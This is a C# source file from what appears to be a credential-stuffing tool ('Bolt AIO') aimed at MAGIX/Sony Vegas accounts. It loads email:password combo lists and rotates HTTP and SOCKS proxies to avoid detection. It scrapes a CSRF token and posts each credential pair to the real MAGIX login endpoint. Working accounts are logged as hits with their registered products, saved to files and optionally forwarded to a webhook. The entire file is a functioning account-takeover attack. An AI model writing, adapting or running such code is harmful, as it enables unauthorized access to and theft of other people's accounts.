using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using BoltCUI;
using Leaf.xNet;

namespace Bolt_AIO
{
    internal class SonyVegasmod
    {
        public static List<string> Combos = Program.Combos;
        public static int Combosindex;

        public static void Check()
        {
            for (;;)
            {
                if (Program.Proxyindex > Program.Proxies.Count() - 2) Program.Proxyindex = 0;
                try
                {
                    Interlocked.Increment(ref Program.Proxyindex);
                    using (var req = new HttpRequest())
                    {
                        if (Combosindex >= Combos.Count())
                        {
                            Program.Stop++;
                            break;
                        }

                        Interlocked.Increment(ref Combosindex);
                        var array = Combos[Combosindex].Split(':', ';', '|');
                        var text = array[0] + ":" + array[1];
                        try
                        {
                            switch (Program.ProxyType1)
                            {
                                case "HTTP":
                                    req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS4":
                                    req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS5":
                                    req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                            }

                            req.SslCertificateValidatorCallback =
                                (RemoteCertificateValidationCallback) Delegate.Combine(
                                    req.SslCertificateValidatorCallback,
                                    new RemoteCertificateValidationCallback((obj, cert, ssl, error) =>
                                        (cert as X509Certificate2).Verify()));
                            req.IgnoreProtocolErrors = true;
                            req.KeepAlive = true;
                            req.AllowAutoRedirect = true;
                            req.AddHeader("Pragma", " no-cache");
                            req.AddHeader("Accept", " */*");
                            req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
                            var res = req.Get("https://ap.magix.com/servicecenter/index.php?lang=US&style=vegas19")
                                .ToString();
                            var csrf = Parse(res, "input type=\"hidden\" name=\"mx_csrf_token\" value=\"", "\">");
                            req.AddHeader("Pragma", " no-cache");
                            req.AddHeader("Accept", " */*");
                            req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
                            res = req.Post("https://ap.magix.com/servicecenter/index.php?lang=US&style=vegas19",
                                    "module=quickregister&submode=login&b=1&fm_logintype=1&fm_email=" + array[0] +
                                    "&fm_pass=" + array[1] + "&mx_csrf_token=" + csrf,
                                    "application/x-www-form-urlencoded")
                                .ToString();
                            if (res.Contains("Login incorrect") || res.Contains("login data was not accepted")) break;

                            if (res.Contains("User data") || res.Contains("My products"))
                            {
                                req.AddHeader("Pragma", " no-cache");
                                req.AddHeader("Accept", " */*");
                                req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
                                res = req.Get(
                                        "https://ap.magix.com/servicecenter/index.php?lang=US&style=vegas19&module=myproducts")
                                    .ToString();
                                if (res.Contains("User data") &&
                                    res.Contains("You have registered the following MAGIX products.") == false)
                                {
                                    Program.Frees++;
                                    Program.TotalChecks++;
                                    Export.AsResult("/Sonyvegas_frees", array[0] + ":" + array[1]);
                                    if (Program.lorc == "LOG")
                                        Settings.PrintFree("Sonyvegas", array[0] + ":" + array[1]);
                                }
                                else if (res.Contains(
                                    "><td colspan=2 class=\"tableColumnTypeHeadline\" valign=\"middle\" height=\"25\"><b>")
                                )
                                {
                                    var prod = Parse(res,
                                        "><td colspan=2 class=\"tableColumnTypeHeadline\" valign=\"middle\" height=\"25\"><b>",
                                        "</b></td>");
                                    Program.Hits++;
                                    Program.TotalChecks++;
                                    Export.AsResult("/Sonyvegas_hits",
                                        array[0] + ":" + array[1] + " | Products: " + prod);
                                    if (Program.lorc == "LOG")
                                        Settings.PrintHit("Sonyvegas",
                                            array[0] + ":" + array[1] + " | Products: " + prod);
                                    if (Settings.sendToWebhook)
                                        Settings.sendTowebhook1(array[0] + ":" + array[1] + " | Products: " + prod,
                                            "Sonyvegas Hits");
                                }
                            }
                        }
                        catch (Exception)
                        {
                            Program.Combos.Add(text);
                        }
                    }
                }
                catch
                {
                    Interlocked.Increment(ref Program.Errors);
                }
            }
        }

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] {left}, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }

        public static string Base64Encode(string plainText)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
        }
    }
}